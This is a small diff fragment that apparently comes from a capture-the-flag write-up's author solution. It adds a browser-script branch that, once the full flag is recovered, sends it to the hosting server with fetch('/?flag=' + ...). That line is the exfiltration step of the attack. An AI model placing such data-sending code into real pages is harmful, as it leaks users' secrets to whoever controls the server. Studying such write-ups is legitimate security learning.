@@ -79,6 +79,9 @@ Author solution (with my comments):
             await new Promise(r => setTimeout(r, 1000));
             console.log("idle");
           }
+        } else{
+          // We have the full flag
+          fetch("/?flag=" + known);
         }
         })();
     </script>
